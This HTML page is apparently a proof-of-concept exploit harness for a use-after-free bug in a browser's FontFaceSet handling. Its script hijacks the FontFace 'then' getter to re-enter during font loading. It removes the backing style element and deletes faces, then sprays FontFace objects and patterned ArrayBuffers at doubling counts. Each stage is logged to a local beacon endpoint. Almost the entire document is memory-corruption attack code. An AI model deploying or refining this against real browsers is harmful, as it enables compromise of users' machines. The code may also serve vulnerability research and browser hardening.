<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>FontFaceSet UAF ladder (14.10)</title></head>
<body>
<textarea id="log" readonly style="width:100%;height:300px"></textarea>
<script>
(function(){
  var logEl = document.getElementById('log');
  var cfg = { del: 0, rm: 1, layout: 1, bufs_ig: 0, bufsz: 256 };
  try {
    var xc = new XMLHttpRequest();
    xc.open('GET', '/corpus/ffset-config.json?t=' + Date.now(), false);
    xc.send();
    var c = JSON.parse(xc.responseText);
    if (c.del !== undefined) cfg.del = c.del ? 1 : 0;
    if (c.rm !== undefined) cfg.rm = c.rm ? 1 : 0;
    if (c.layout !== undefined) cfg.layout = c.layout ? 1 : 0;
    if (c.bufs_ig !== undefined) cfg.bufs_ig = c.bufs_ig | 0;
    if (c.bufsz !== undefined) cfg.bufsz = c.bufsz | 0;
  } catch (e) {}

  var step = 0;

  function syncLog(tag, msg) {
    var line = 'LAD step=' + step + ' del=' + cfg.del + ' rm=' + cfg.rm + ' lay=' + cfg.layout +
               ' bufs=' + cfg.bufs_ig + 'x' + cfg.bufsz + ' ' + tag + ' ' + msg;
    logEl.value += line + '\n';
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/' + tag, false);
      x.send(line);
    } catch (e) {}
  }

  var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
  document.fonts.add(A);
  void A.loaded;

  var fired = false;
  Object.defineProperty(FontFace.prototype, 'then', {
    configurable: true,
    get: function() {
      if (fired) return undefined;
      fired = true;
      syncLog('GETTER', 'enter');
      if (cfg.rm) {
        try {
          var st = document.getElementById('victim-' + step);
          if (st) { st.remove(); syncLog('GETTER', 'style-removed'); }
        } catch (e) { syncLog('GETTER', 'style-err ' + e); }
      }
      if (cfg.layout) {
        try { void document.body.offsetHeight; } catch (e) {}
      }
      var n = step;
      if (n > 0) {
        var hold = window.__hold || (window.__hold = []);
        var made = 0;
        for (var i = 0; i < n; i++) {
          try {
            var f = new FontFace('q' + step + '_' + i, 'local(Arial)', { unicodeRange: 'U+0044' });
            document.fonts.add(f);
            hold.push(f);
            made++;
          } catch (e) { break; }
        }
        syncLog('GETTER', 'jsfaces ' + made);
      }
      if (cfg.bufs_ig > 0) {
        var hold2 = window.__bufs || (window.__bufs = []);
        for (var j = 0; j < cfg.bufs_ig; j++) {
          try {
            var ab = new ArrayBuffer(cfg.bufsz || 0x100);
            var u = new Uint8Array(ab);
            for (var k = 0; k < u.length; k++) u[k] = 0x41 + (k & 0xF);
            hold2.push(ab);
          } catch (e) { break; }
        }
        syncLog('GETTER', 'bufs ' + cfg.bufs_ig);
      }
      if (cfg.del) {
        try { document.fonts.delete(this); syncLog('GETTER', 'delete'); } catch (e) {}
      }
      syncLog('GETTER', 'returning');
      return undefined;
    },
    set: function() {}
  });

  function attempt(n) {
    step = n;
    fired = false;
    var st = document.createElement('style');
    st.id = 'victim-' + n;
    st.textContent = '@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }';
    document.head.appendChild(st);
    syncLog('CALL', 'load n=' + n);
    document.fonts.load('1em a, x', 'AB').then(
      function(list) { syncLog('RESOLVED', 'n=' + n + ' size=' + (list ? list.length : -1)); },
      function(e) { syncLog('REJECTED', 'n=' + n + ' ' + e); }
    );
    syncLog('PROMISE', 'returned n=' + n);
    setTimeout(function() {
      syncLog('SURVIVED', 'n=' + n);
      if (n === 0 || n === 1) return attempt(n === 0 ? 1 : 2);
      if (n === 2) return attempt(4);
      if (n === 4) return attempt(8);
      if (n === 8) return attempt(16);
      if (n === 16) return attempt(32);
      if (n === 32) return attempt(64);
      syncLog('ALIVE', 'ladder complete');
    }, 250);
  }

  attempt(0);
})();
</script>
</body></html>
